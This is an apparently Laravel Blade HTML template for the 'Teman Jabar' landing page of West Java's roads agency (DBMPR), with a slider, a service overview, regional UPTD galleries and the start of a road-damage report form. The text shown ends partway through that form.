<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <link type="text/css" rel="stylesheet"
        href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Google+Sans:400,500,700">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="{{ asset('assets/images/favicon/favicon.ico') }}" rel="icon">
    <link rel="stylesheet" href="{{ asset('assets/vendor/bootstrap/css/bootstrap.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/fontawesome/css/all.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/extras/css/animate.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/owl-carousel/css/owl.carousel.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/fancybox/css/jquery.fancybox.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/tooltipster/css/tooltipster.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/cubeportfolio/css/cubeportfolio.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/revolution/css/navigation.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/vendor/_landing/revolution/css/settings.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/css/landing_style.css') }}">
    <!-- favicon -->
    <link rel="apple-touch-icon" sizes="180x180" href="{{ asset('assets/images/favicon/apple-touch-icon.png') }}">
    <link rel="icon" type="image/png" sizes="32x32" href="{{ asset('assets/images/favicon/favicon-32x32.png') }}">
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('assets/images/favicon/favicon-16x16.png') }}">
    <link rel="manifest" href="{{ asset('assets/images/favicon/site.webmanifest') }}">

    <title>Teman Jabar</title>
</head>
<body data-spy="scroll" data-target=".navbar-nav" data-offset="75" class="offset-nav">
    <!--PreLoader-->
    <div class="loader">
        <div class="loader-inner">
            <div class="cssload-loader"></div>
        </div>
    </div>
    <!--PreLoader Ends-->
    <!-- header -->
    <header class="site-header" id="header">
        <nav class="navbar navbar-expand-lg transparent-bg static-nav">
            <div class="container">
                <a class="navbar-brand" href="index.html">
                    <img src="{{ asset('assets/images/brand/text_putih.png') }}" alt=" logo" class="logo-default">
                    <img src="{{ asset('assets/images/brand/text_hitam.png') }}" alt="logo" class="logo-scrolled">
                </a>
                <div class="collapse navbar-collapse">
                    <ul class="navbar-nav mx-auto ml-xl-auto mr-xl-0">
                        <li class="nav-item">
                            <a class="nav-link active pagescroll" href="#home">Beranda</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll scrollupto" href="#about">Tentang Kami</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#portfolio">UPTD</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#ourfaq">Laporan Jalan</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#stayconnect1">Kontak</a>
                        </li>
                    </ul>
                </div>
            </div>
            <!--side menu open button-->
            <a href="javascript:void(0)" class="d-inline-block sidemenu_btn" id="sidemenu_toggle">
                <span></span> <span></span> <span></span>
            </a>
        </nav>
        <!-- side menu -->
        <div class="side-menu opacity-0 gradient-bg">
            <div class="overlay"></div>
            <div class="inner-wrapper">
                <span class="btn-close btn-close-no-padding" id="btn_sideNavClose"><i></i><i></i></span>
                <nav class="side-nav w-100">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link active pagescroll" href="#home">Beranda</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll scrollupto" href="#about">Tentang Kami</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#portfolio">UPTD</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#ourfaq">Laporan Jalan</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link pagescroll" href="#stayconnect1">Kontak</a>
                        </li>
                    </ul>
                </nav>
                <div class="side-footer w-100">
                    <ul class="social-icons-simple white top40">
                        <li><a href="javascript:void(0)" class="facebook"><i class="fab fa-facebook-f"></i> </a> </li>
                        <li><a href="javascript:void(0)" class="twitter"><i class="fab fa-twitter"></i> </a> </li>
                        <li><a href="javascript:void(0)" class="insta"><i class="fab fa-instagram"></i> </a> </li>
                    </ul>
                    <p class="whitecolor">&copy; <span id="year"></span> DBPMR Jawa Barat</p>
                </div>
            </div>
        </div>
        <div id="close_side_menu" class="tooltip"></div>
        <!-- End side menu -->
    </header>
    <!-- header -->
    <!--Main Slider-->
    <section id="home" class="position-relative">
        <div id="revo_main_wrapper" class="rev_slider_wrapper fullwidthbanner-container m-0 p-0 bg-dark"
            data-alias="classic4export" data-source="gallery">
            <!-- START REVOLUTION SLIDER 5.4.1 fullwidth mode -->
            <div id="rev_main" class="rev_slider fullwidthabanner white" data-version="5.4.1">
                <ul>
                    <!-- SLIDE 1 -->
                    <li data-index="rs-01" data-transition="fade" data-slotamount="default"
                        data-easein="Power100.easeIn" data-easeout="Power100.easeOut" data-masterspeed="2000"
                        data-fsmasterspeed="1500" data-param1="01">
                        <!-- MAIN IMAGE -->
                        <img src="{{ asset('assets/images/slider/hero01.jpg') }}" alt="" data-bgposition="center center" data-bgfit="cover"
                            data-bgrepeat="no-repeat" data-bgparallax="10" class="rev-slidebg" data-no-retina>
                        <div class="overlay overlay-dark opacity-6"></div>
                        <!-- LAYER NR. 1 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-130','-130','-110','-80']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">DBMPR</h1>
                        </div>
                        <!-- LAYER NR. 2 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-70','-70','-50','-20']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-bold whitecolor text-center">Konektivitas</h1>
                        </div>
                        <!-- LAYER NR. 3 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-10','-10','10','40']" data-width="none" data-height="none" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="1500"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">seluruh wilayah</h1>
                        </div>
                        <!-- LAYER NR. 4 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['40','40','60','90']" data-width="none" data-height="none"
                            data-whitespace="nowrap" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="2000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":1500,"to":"o:1;","delay":2000,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <!-- <h4 class="whitecolor font-xlight text-center">The Best Multipurpose Multi Page Template in
                                Market</h4> -->
                        </div>
                    </li>
                    <!-- SLIDE 2 -->
                    <li data-index="rs-02" data-transition="fade" data-slotamount="default"
                        data-easein="Power3.easeInOut" data-easeout="Power3.easeInOut" data-masterspeed="2000"
                        data-fsmasterspeed="1500" data-param1="02">
                        <!-- MAIN IMAGE -->
                        <img src="{{ asset('assets/images/slider/hero02.jpg') }}" alt="" data-bgposition="center center" data-bgfit="cover"
                            data-bgrepeat="no-repeat" data-bgparallax="10" class="rev-slidebg" data-no-retina>
                        <div class="overlay overlay-dark opacity-6"></div>
                        <!-- LAYER NR. 1 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-130','-130','-110','-80']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">Proses
                            </h1>
                        </div>
                        <!-- LAYER NR. 2 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-70','-70','-50','-20']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-bold whitecolor text-center">Groundbreaking</h1>
                        </div>
                        <!-- LAYER NR. 3 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-10','-10','10','40']" data-width="none" data-height="none" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="1500"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">Dengan Vendor
                            </h1>
                        </div>
                        <!-- LAYER NR. 4 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['40','40','60','90']" data-width="none" data-height="none"
                            data-whitespace="nowrap" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="2000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":1500,"to":"o:1;","delay":2000,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <!-- <h4 class="whitecolor font-xlight text-center">Responsive and Retina Ready for All Devices
                            </h4> -->
                        </div>
                    </li>
                    <!-- SLIDE 3 -->
                    <li data-index="rs-03" data-transition="fade" data-slotamount="default"
                        data-easein="Power3.easeInOut" data-easeout="Power3.easeInOut" data-masterspeed="2000"
                        data-fsmasterspeed="1500" data-param1="03">
                        <!-- MAIN IMAGE -->
                        <img src="{{ asset('assets/images/slider/hero03.jpg') }}" alt="" data-bgposition="center center" data-bgfit="cover"
                            data-bgrepeat="no-repeat" data-bgparallax="10" class="rev-slidebg" data-no-retina>
                        <div class="overlay overlay-dark opacity-7"></div>
                        <!-- LAYER NR. 1 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-130','-130','-110','-80']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">membantu</h1>
                        </div>
                        <!-- LAYER NR. 2 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-70','-70','-50','-20']" data-width="none" data-height="none"
                            data-type="text" data-textAlign="['center','center','center','center']"
                            data-responsive_offset="on" data-start="1000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-bold whitecolor text-center">Pembangunan
                            </h1>
                        </div>
                        <!-- LAYER NR. 3 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['-10','-10','10','40']" data-width="none" data-height="none" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="1500"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":2000,"to":"o:1;","delay":1500,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <h1 class="text-capitalize font-xlight whitecolor text-center">Tata kelola</h1>
                        </div>
                        <!-- LAYER NR. 4 -->
                        <div class="tp-caption tp-resizeme" data-x="['center','center','center','center']"
                            data-hoffset="['0','0','0','0']" data-y="['middle','middle','middle','middle']"
                            data-voffset="['40','40','60','90']" data-width="none" data-height="none"
                            data-whitespace="nowrap" data-type="text"
                            data-textAlign="['center','center','center','center']" data-responsive_offset="on"
                            data-start="2000"
                            data-frames='[{"from":"y:[100%];z:0;rX:0deg;rY:0;rZ:0;sX:1;sY:1;skX:0;skY:0;opacity:0;","mask":"x:0px;y:[100%];s:inherit;e:inherit;","speed":1500,"to":"o:1;","delay":2000,"ease":"Power4.easeInOut"},{"delay":"wait","speed":1000,"to":"y:[100%];","mask":"x:inherit;y:inherit;s:inherit;e:inherit;","ease":"Power2.easeInOut"}]'>
                            <!-- <h4 class="whitecolor font-xlight text-center">Is a New Design Studio founded in NewYork
                            </h4> -->
                        </div>
                    </li>
                </ul>
            </div>
        </div>
        <ul class="social-icons-simple revicon white">
            <li class="d-table"><a href="javascript:void(0)" class="facebook"><i class="fab fa-facebook-f"></i></a>
            </li>
            <li class="d-table"><a href="javascript:void(0)" class="twitter"><i class="fab fa-twitter"></i> </a> </li>
            <li class="d-table"><a href="javascript:void(0)" class="linkedin"><i class="fab fa-linkedin-in"></i> </a>
            </li>
            <li class="d-table"><a href="javascript:void(0)" class="insta"><i class="fab fa-instagram"></i> </a> </li>
        </ul>
    </section>
    <!--Main Slider ends -->
    <!--Some Services-->
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div id="services-slider" class="owl-carousel">
                    <div class="item">
                        <div class="service-box">
                            <span class="bottom25"><i class="fas fa-road"></i></span>
                            <h4 class="bottom10 text-nowrap"><a href="javascript:void(0)">Progress Pekerjaan</a></h4>
                            <p>Pantau semua proses pembangunan yang sedang dilakukan</p>
                        </div>
                    </div>
                    <div class="item">
                        <div class="service-box">
                            <span class="bottom25"><i class="fas fa-text-width"></i></span>
                            <h4 class="bottom10"><a href="javascript:void(0)">Pelebaran Jalan</a></h4>
                            <p>Cek jalan mana saja yang sudah kami perlebar dan perbaiki</p>
                        </div>
                    </div>
                    <div class="item">
                        <div class="service-box">
                            <span class="bottom25"><i class="fas fa-box-open"></i></span>
                            <h4 class="bottom10"><a href="{{ url('paket_pekerjaan')}}">Paket Pekerjaan</a></h4>
                            <p>projek pembangunan infrastruktur yang sudah kami selesaikan</p>
                        </div>
                    </div>
                    <div class="item">
                        <div class="service-box">
                            <span class="bottom25"><i class="fas fa-bullhorn"></i></span>
                            <h4 class="bottom10"><a href="#ourfaq">Pengaduan</a></h4>
                            <p>Ada masalah dengan insfrastruktur di daerah kamu? Segera lapor kepada kami!</p>
                        </div>
                    </div>
                    <div class="item">
                        <div class="service-box">
                            <span class="bottom25"><i class="fas fa-map"></i></span>
                            <h4 class="bottom10"><a href="#portfolio">UPTD</a></h4>
                            <p>Perkembangan pembangunan disetiap kabupaten/kota</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!--Some Services ends-->
    <!--Some Feature -->
    <section id="about" class="single-feature padding mt-n5">
        <div class="container">
            <div class="row d-flex align-items-center">
                <div class="col-lg-6 col-md-7 col-sm-7 text-sm-left text-center wow fadeInLeft" data-wow-delay="300ms">
                    <div class="heading-title mb-4">
                        <h2 class="darkcolor font-normal bottom30">Kami <span class="defaultcolor">DBMPR</span> Provinsi
                            Jawa Barat</h2>
                    </div>
                    <p class="bottom35">
                        Dinas Bina Marga dan Penataan Ruang Provinsi Jawa Barat merupakan salah satu dari dinas daerah
                        dan menjadi bagian dari Pemerintah Daerah Provinsi Jawa Barat. Merupakan unsur pelaksana otonomi
                        daerah yang mempunyai tugas melaksanakan urusan Bidang Kebinamargaan dan Penataan Ruang serta
                        Tugas Pembantuan.
                    </p>
                    <a href="http://dbmtr.jabarprov.go.id/" class="button gradient-btn mb-sm-0 mb-4">Lihat
                        Selengkapnya</a>
                </div>
                <div class="col-lg-5 offset-lg-1 col-md-5 col-sm-5 wow fadeInRight" data-wow-delay="300ms">
                    <div class="image"><img alt="SEO" src="{{ asset('assets/images/about/about.jpg') }}"></div>
                </div>
            </div>
        </div>
    </section>
    <!--Some Feature ends-->
    <!-- Counters -->
    <section id="bg-counters" class="padding bg-counters parallax">
        <div class="container">
            <div class="row align-items-center text-center">
                <div class="col-lg-4 col-md-4 col-sm-4 bottom10">
                    <div class="counters whitecolor  top10 bottom10">
                        <span class="count_nums font-light" data-to="874" data-speed="2500"> </span>
                    </div>
                    <h3 class="font-light whitecolor top20">Intrastruktur Yang terselesaikan diseluruh wilayah Jawa
                        Barat</h3>
                </div>
                <div class="col-lg-4 col-md-4 col-sm-4">
                    <p class="whitecolor top20 bottom20 font-light title">Kami terus meningkatkan konektivitas jalan dan
                        infrastruktur ke seluruh wilayah Jawa Barat</p>
                </div>
                <div class="col-lg-4 col-md-4 col-sm-4 bottom10">
                    <div class="counters whitecolor top10 bottom10">
                        <span class="count_nums font-light" data-to="1200" data-speed="2500"> </span>
                    </div>
                    <h3 class="font-light whitecolor top20">Target Infrasturktur diseluruh wilayah Jawa Barat</h3>
                </div>
            </div>
        </div>
    </section>
    <!-- Counters ends-->
    <!-- Gallery -->
    <section id="portfolio" class="position-relative padding">
        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center wow fadeIn" data-wow-delay="300ms">
                    <div class="heading-title darkcolor wow fadeInUp" data-wow-delay="300ms">
                        <span class="defaultcolor"> Ayo pantau proses pembangunan di daerah kamu </span>
                        <h2 class="font-normal darkcolor heading_space_half"> Unit Pelaksana Teknis Dinas Daerah (UPTD)
                        </h2>
                    </div>
                    <div class="col-md-6 offset-md-3 heading_space_half">
                        <p>Kabupaten/Kota di seluruh Jawa Barat</p>
                    </div>
                </div>
                <div class="col-lg-12">
                    <div id="mosaic-filter" class="cbp-l-filters bottom30 wow fadeIn text-center"
                        data-wow-delay="350ms">
                        <div data-filter="*" class="cbp-filter-item">
                            <span>All</span>
                        </div>
                        <div data-filter=".uptd1" class="cbp-filter-item">
                            <span>UPTD-I</span>
                        </div>
                        <div data-filter=".uptd2" class="cbp-filter-item">
                            <span>UPTD-II</span>
                        </div>
                        <div data-filter=".uptd3" class="cbp-filter-item">
                            <span>UPTD-III</span>
                        </div>
                        <div data-filter=".uptd4" class="cbp-filter-item">
                            <span>UPTD-IV</span>
                        </div>
                        <div data-filter=".uptd5" class="cbp-filter-item">
                            <span>UPTD-V</span>
                        </div>
                        <div data-filter=".uptd6" class="cbp-filter-item">
                            <span>UPTD-VI</span>
                        </div>
                    </div>
                </div>
                <div class="col-lg-12">
                    <div id="grid-mosaic" class="cbp cbp-l-grid-mosaic-flat">
                        <!--Item 1-->
                        <div class="cbp-item uptd1">
                            <img src="{{ asset('assets/images/uptd/uptd1.jpg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-5.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd1/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KAB.CIANJUR-KOTA/KAB.BOGOR-KOTA DEPOK-KOTA/KAB.BEKASI</h4>
                                </div>
                            </div>
                        </div>
                        <!--Item 2-->
                        <div class="cbp-item uptd2">
                            <img src="{{ asset('assets/images/uptd/uptd2.jpg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-7.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd2/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KOTA&KAB SUKABUMI</h4>
                                </div>
                            </div>
                        </div>
                        <!--Item 3-->
                        <div class="cbp-item uptd3">
                            <img src="{{ asset('assets/images/uptd/uptd3.jpg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-11.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd3/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KOTA/KAB.BANDUNG-KOTA CIMAHI-KAB.BANDUNG BARAT-KAB.
                                        SUBANG-KAB.PURWAKARTA-KAB.KARAWANG</h4>
                                </div>
                            </div>
                        </div>
                        <!--Item 4-->
                        <div class="cbp-item uptd4">
                            <img src="{{ asset('assets/images/uptd/uptd4.jpeg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-6.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd4/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KAB.SUMEDANG-KAB.GARUT</h4>
                                </div>
                            </div>
                        </div>
                        <!--Item 5-->
                        <div class="cbp-item uptd5">
                            <img src="{{ asset('assets/images/uptd/uptd5.jpg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-8.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd5/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KAB./KOTA TASIKMALAYA-KOTA
                                        BANJAR-KAB.CIAMIS-KAB.PANGANDARAN-KAB.KUNINGAN</h4>
                                </div>
                            </div>
                        </div>
                        <!--Item 6-->
                        <div class="cbp-item uptd6">
                            <img src="{{ asset('assets/images/uptd/uptd6.jpg') }}" alt="">
                            <div class="gallery-hvr whitecolor">
                                <div class="center-box">
                                    <a href="{{ asset('assets/images/gallery-9.jpg') }}" class="opens" data-fancybox="gallery"
                                        title="Zoom In"> <i class="fa fa-search-plus"></i></a>
                                    <a href="{{ url('uptd/uptd6/') }}" class="opens" title="View Details"> <i
                                            class="fas fa-link"></i></a>
                                    <h4 class="w-100">WILAYAH KOTA/KAB. CIREBON - KAB. MAJALENGKA- KAB. INDRAMAYU</h4>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- <div class="col-lg-12">
                        Load more itema from another html file using ajax
                        <div id="js-loadMore-mosaic" class="cbp-l-loadMore-button ">
                            <a href="load-more.html"
                                class="cbp-l-loadMore-link border-0 font-13 button gradient-btn whitecolor transition-3"
                                rel="nofollow">
                                <span class="cbp-l-loadMore-defaultText">Load More (<span
                                        class="cbp-l-loadMore-loadItems">6</span>)</span>
                                <span class="cbp-l-loadMore-loadingText">Loading <i
                                        class="fas fa-spinner fa-spin"></i></span>
                                <span class="cbp-l-loadMore-noMoreLoading d-none">NO MORE WORKS</span>
                            </a>
                        </div>
                    </div> -->
                </div>
            </div>
        </div>
    </section>
    <!-- Gallery ends -->
    <!-- Main sign-up section starts -->
    <section id="ourfaq" class="bglight position-relative padding">
        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center wow fadeIn" data-wow-delay="300ms">
                    <h2 class="heading bottom40 darkcolor font-light2"><span class="font-normal">Laporkan</span> Jalan
                        Rusak
                        <span class="divider-center"></span>
                    </h2>
                    <div class="col-md-8 offset-md-2 heading_space">
                        <p>Ayok bangun Infrastruktur bersama-sama...Laporkan jalan rusak di sekitar kamu,kami akan
                            SEGERA memperbaikinya.</p>
                    </div>
                </div>
                <div class="col-lg-6 col-md-12 col-sm-12 pr-lg-0 whitebox wow fadeInLeft">
                    <div class="widget logincontainer">
                        <h3 class="darkcolor bottom35 text-center text-md-left">Identitas Pelapor </h3>
                        <form class="getin_form border-form" id="register">
                            <div class="row">
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="registerName" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Nama Lengkap:" required
                                            id="registerName">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="nik" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="NIK:" required id="nik">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="telp" class="d-none"></label>
                                        <input class="form-control" type="text" placeholder="Telp:" required id="telp">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label for="registerEmail" class="d-none"></label>
                                        <input class="form-control" type="email" placeholder="Email:" required
                                            id="registerEmail">
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label class="my-1 mr-2" for="pilihanKeluhan">Keluhan</label>
                                        <select class="custom-select my-1 mr-sm-2" id="pilihanKeluhan" required>
                                            <option selected>Pilih...</option>
                                            <option value="1">Kepuasan Masyarakat</option>
                                            <option value="2">Jalan Berlubang</option>
                                            <option value="3">Trotoar Rusak</option>
                                            <option value="4">Jembatan Rusak</option>
                                            <option value="5">Tiang/Kabel listrik menggangu</option>
                                            <option value="6">Tidak ada akses jalan</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-12 col-sm-12">
                                    <div class="form-group bottom35">
                                        <label class="my-1 mr-2" for="pilihanUptd">UPTD</label>
                                        <select class="custom-select my-1 mr-sm-2" id="pilihanUptd" required>
                                            <option selected>Pilih...</option>
                                            <option value="1">UPTD-I</option>
                                            <option value="2">UPTD-II</option>
                                            <option value="3">UPTD-III</option>
                                            <option value="4">UPTD-IV</option>
                                            <option value="5">UPTD-V</option>
